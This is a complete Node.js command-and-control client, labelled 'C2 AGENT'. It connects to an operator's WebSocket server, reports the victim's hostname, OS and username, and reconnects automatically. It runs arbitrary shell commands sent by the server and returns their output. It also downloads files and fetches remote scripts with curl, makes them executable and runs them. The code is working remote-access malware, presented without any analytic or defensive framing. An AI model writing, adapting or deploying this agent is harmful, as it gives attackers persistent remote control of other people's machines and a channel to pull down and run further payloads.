// ============================================
// C2 AGENT (CLIENT)
// Usage: node client.js <server_ip> <port>
// ============================================

const WebSocket = require('ws');
const { exec } = require('child_process');
const path = require('path');
const os = require('os');

const SERVER_IP = process.argv[2] || process.env.C2_SERVER || '127.0.0.1';
const PORT      = process.argv[3] || process.env.C2_PORT   || 4444;
const USE_WSS   = process.env.USE_WSS === 'true' || PORT == 443;
const WS_URL    = `${USE_WSS ? 'wss' : 'ws'}://${SERVER_IP}${USE_WSS ? '' : ':' + PORT}`;
const RECONNECT = 5000;

let ws;

function connect() {
    ws = new WebSocket(WS_URL);

    ws.on('open', () => {
        send({
            type: 'info',
            data: `Agent online | Host: ${os.hostname()} | OS: ${os.platform()} | User: ${os.userInfo().username} | Arch: ${os.arch()}`
        });
    });

    ws.on('message', (data) => {
        try {
            handleCommand(JSON.parse(data));
        } catch (e) {}
    });

    ws.on('close', () => setTimeout(connect, RECONNECT));
    ws.on('error', ()  => {});
}

function send(payload) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(payload));
    }
}

function handleCommand(msg) {
    switch (msg.type) {

        case 'exec':
            exec(msg.cmd, { timeout: 15000 }, (err, stdout, stderr) => {
                send({ type: 'output', data: stdout || stderr || err?.message || '(no output)' });
            });
            break;

        case 'download':
            const fname   = path.basename(new URL(msg.url).pathname) || 'file';
            const outPath = path.join(os.tmpdir(), fname);
            exec(`curl -s -L "${msg.url}" -o "${outPath}"`, { timeout: 30000 }, (err) => {
                send({ type: 'output', data: err ? `Download failed: ${err.message}` : `Saved to ${outPath}` });
            });
            break;

        case 'run':
            const sname      = path.basename(new URL(msg.url).pathname) || 'script.sh';
            const scriptPath = path.join(os.tmpdir(), sname);
            exec(`curl -s -L "${msg.url}" -o "${scriptPath}" && chmod +x "${scriptPath}"`, { timeout: 30000 }, (err) => {
                if (err) { send({ type: 'output', data: `Fetch failed: ${err.message}` }); return; }
                exec(`"${scriptPath}"`, { timeout: 30000 }, (err2, stdout2, stderr2) => {
                    send({ type: 'output', data: stdout2 || stderr2 || err2?.message || '(no output)' });
                });
            });
            break;
    }
}

connect();
